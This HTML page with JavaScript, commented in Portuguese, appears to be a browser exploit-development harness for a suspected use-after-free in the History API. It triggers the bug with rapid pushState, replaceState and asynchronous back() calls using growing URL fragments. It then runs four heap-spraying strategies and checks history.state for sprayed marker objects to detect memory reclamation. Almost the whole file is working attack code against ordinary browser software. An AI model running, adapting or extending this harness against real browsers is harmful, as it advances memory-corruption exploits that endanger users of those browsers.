<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Slot Fixation V4 - UAF CORRETO</title>
</head>
<body>
<h1>Slot Fixation V4 - Sequencia UAF CORRETA</h1>
<button onclick="runTest()">RUN TEST</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m) { logEl.textContent += m + "\n"; }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ========================================
// UAF TRIGGER - SEQUENCIA EXATA VALIDADA
// ========================================
async function triggerUAF() {
    log("=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;
    
    for(let i = 0; i < 48; i++) {
        let frag = "A".repeat(size);
        history.pushState({i: i}, "", "#" + frag);
        history.replaceState({i: i}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) {
            setTimeout(() => history.back(), 0);
            log("[ITER " + i + "] back() async");
        }
        
        size += STEP;
        await sleep(5);
    }
    
    log(">>> UAF WINDOW <<<");
    await sleep(120);
}

// ========================================
// ESTRATEGIA 1: SHAPE UNICO CONSISTENTE
// ========================================
function strategy1_uniformShape() {
    log("\n=== STRATEGY 1: Uniform Shape ===");
    let spray = [];
    
    // TODOS os objetos com EXATAMENTE o mesmo shape
    for(let i = 0; i < 10000; i++) {
        spray.push({
            marker: 0x41414141,
            index: i
        });
    }
    
    log("Sprayed: " + spray.length + " uniform objects");
    return spray;
}

// ========================================
// ESTRATEGIA 2: TIMING PRECISO (MICROTASK)
// ========================================
function strategy2_microtaskTiming(callback) {
    log("\n=== STRATEGY 2: Microtask Timing ===");
    
    // Alocar NO MESMO TICK que o back() assíncrono
    Promise.resolve().then(() => {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            spray.push({
                ctrl: "MICRO",
                idx: i
            });
        }
        log("Microtask spray: " + spray.length);
        window.__micro = spray;
        callback();
    });
}

// ========================================
// ESTRATEGIA 3: PRESSURE-RELEASE-CAPTURE
// ========================================
async function strategy3_pressureRelease() {
    log("\n=== STRATEGY 3: Pressure-Release-Capture ===");
    
    // FASE 1: PRESSURE
    let pressure = [];
    for(let i = 0; i < 15000; i++) {
        pressure.push({a: i, b: i});
    }
    log("Phase 1: Pressure applied (" + pressure.length + ")");
    
    await sleep(50);
    
    // FASE 2: RELEASE
    pressure = null;
    log("Phase 2: Released");
    
    await sleep(30);
    
    // FASE 3: CAPTURE
    let capture = [];
    for(let i = 0; i < 12000; i++) {
        capture.push({
            tag: "CAPTURE",
            id: i,
            val: 0xDEADBEEF
        });
    }
    log("Phase 3: Captured (" + capture.length + ")");
    
    return capture;
}

// ========================================
// ESTRATEGIA 4: MULTIPLE CANDIDATES
// ========================================
function strategy4_multipleCandidates() {
    log("\n=== STRATEGY 4: Multiple Candidates ===");
    let keeps = [];
    
    // Tipo 1: JSObject inline puro
    for(let i = 0; i < 3000; i++) {
        keeps.push({x: i, y: i});
    }
    
    // Tipo 2: Object.create(null)
    for(let i = 0; i < 3000; i++) {
        let o = Object.create(null);
        o.p = i;
        o.q = i;
        keeps.push(o);
    }
    
    // Tipo 3: Frozen object
    for(let i = 0; i < 2000; i++) {
        keeps.push(Object.freeze({m: i, n: i}));
    }
    
    log("Multi-candidate spray: " + keeps.length);
    return keeps;
}

// ========================================
// DIAGNOSTICO
// ========================================
function diagnose() {
    log("\n=== DIAGNOSTIC ===");
    log("URL.length: " + location.href.length);
    log("hash.length: " + location.hash.length);
    log("history.length: " + history.length);
    
    try {
        let s = history.state;
        log("history.state: " + JSON.stringify(s));
        
        // Check markers
        if(s && s.marker === 0x41414141) {
            log(">>> MARKER DETECTED (Strategy 1)!");
            log(">>> Index: " + s.index);
        } else if(s && s.ctrl === "MICRO") {
            log(">>> MICROTASK MARKER (Strategy 2)!");
            log(">>> Index: " + s.idx);
        } else if(s && s.tag === "CAPTURE") {
            log(">>> CAPTURE MARKER (Strategy 3)!");
            log(">>> ID: " + s.id);
            log(">>> Val: 0x" + s.val.toString(16));
        } else if(s && (s.x !== undefined || s.p !== undefined || s.m !== undefined)) {
            log(">>> CANDIDATE DETECTED (Strategy 4)!");
            log(">>> Properties: " + Object.keys(s).join(", "));
        } else {
            log("No marker detected. State: " + JSON.stringify(s));
        }
        
    } catch(e) {
        log("State read error: " + e);
    }
}

// ========================================
// TESTES INDIVIDUAIS
// ========================================
async function testStrategy1() {
    logEl.textContent = "";
    log("=== TEST STRATEGY 1: UNIFORM SHAPE ===\n");
    
    await triggerUAF();
    
    log("\n>>> FRAGMENT COLLAPSE <<<");
    history.replaceState({}, "", "#X");
    
    let spray = strategy1_uniformShape();
    
    log("\n>>> COLLISION <<<");
    history.replaceState({ctrl: "TEST"}, "", "#TEST");
    history.back();
    
    await sleep(100);
    diagnose();
    
    window.__keep1 = spray;
    log("\n=== END STRATEGY 1 ===");
}

async function testStrategy2() {
    logEl.textContent = "";
    log("=== TEST STRATEGY 2: MICROTASK TIMING ===\n");
    
    await triggerUAF();
    
    log("\n>>> FRAGMENT COLLAPSE <<<");
    history.replaceState({}, "", "#X");
    
    strategy2_microtaskTiming(() => {
        log("\n>>> COLLISION (from microtask) <<<");
        history.replaceState({ctrl: "TEST"}, "", "#TEST");
        history.back();
        
        setTimeout(() => {
            diagnose();
            log("\n=== END STRATEGY 2 ===");
        }, 100);
    });
}

async function testStrategy3() {
    logEl.textContent = "";
    log("=== TEST STRATEGY 3: PRESSURE-RELEASE-CAPTURE ===\n");
    
    await triggerUAF();
    
    log("\n>>> FRAGMENT COLLAPSE <<<");
    history.replaceState({}, "", "#X");
    
    let spray = await strategy3_pressureRelease();
    
    log("\n>>> COLLISION <<<");
    history.replaceState({ctrl: "TEST"}, "", "#TEST");
    history.back();
    
    await sleep(100);
    diagnose();
    
    window.__keep3 = spray;
    log("\n=== END STRATEGY 3 ===");
}

async function testStrategy4() {
    logEl.textContent = "";
    log("=== TEST STRATEGY 4: MULTIPLE CANDIDATES ===\n");
    
    await triggerUAF();
    
    log("\n>>> FRAGMENT COLLAPSE <<<");
    history.replaceState({}, "", "#X");
    
    let spray = strategy4_multipleCandidates();
    
    log("\n>>> COLLISION <<<");
    history.replaceState({ctrl: "TEST"}, "", "#TEST");
    history.back();
    
    await sleep(100);
    diagnose();
    
    window.__keep4 = spray;
    log("\n=== END STRATEGY 4 ===");
}

// ========================================
// TESTE HIBRIDO (TODOS JUNTOS)
// ========================================
async function testHybrid() {
    logEl.textContent = "";
    log("=== TEST HYBRID: ALL STRATEGIES COMBINED ===\n");
    
    await triggerUAF();
    
    log("\n>>> FRAGMENT COLLAPSE <<<");
    history.replaceState({}, "", "#X");
    
    // Aplicar todas as estratégias em sequência
    let spray1 = strategy1_uniformShape();
    await sleep(20);
    
    let spray3 = await strategy3_pressureRelease();
    await sleep(20);
    
    let spray4 = strategy4_multipleCandidates();
    
    log("\n>>> COLLISION <<<");
    history.replaceState({ctrl: "TEST"}, "", "#TEST");
    history.back();
    
    await sleep(150);
    diagnose();
    
    window.__keepAll = [spray1, spray3, spray4];
    log("\n=== END HYBRID TEST ===");
}

// ========================================
// MENU PRINCIPAL
// ========================================
async function runTest() {
    let choice = prompt(
        "Escolha o teste:\n" +
        "1 - Strategy 1: Uniform Shape\n" +
        "2 - Strategy 2: Microtask Timing\n" +
        "3 - Strategy 3: Pressure-Release-Capture\n" +
        "4 - Strategy 4: Multiple Candidates\n" +
        "5 - HYBRID (todas juntas)\n" +
        "6 - SEQUENCIAL (uma por vez)"
    );
    
    if(choice === "1") {
        await testStrategy1();
    } else if(choice === "2") {
        await testStrategy2();
    } else if(choice === "3") {
        await testStrategy3();
    } else if(choice === "4") {
        await testStrategy4();
    } else if(choice === "5") {
        await testHybrid();
    } else if(choice === "6") {
        await testStrategy1();
        await sleep(2000);
        await testStrategy2();
        await sleep(2000);
        await testStrategy3();
        await sleep(2000);
        await testStrategy4();
    }
}

log("Ready. Click RUN TEST to begin.");
</script>

</body>
</html>
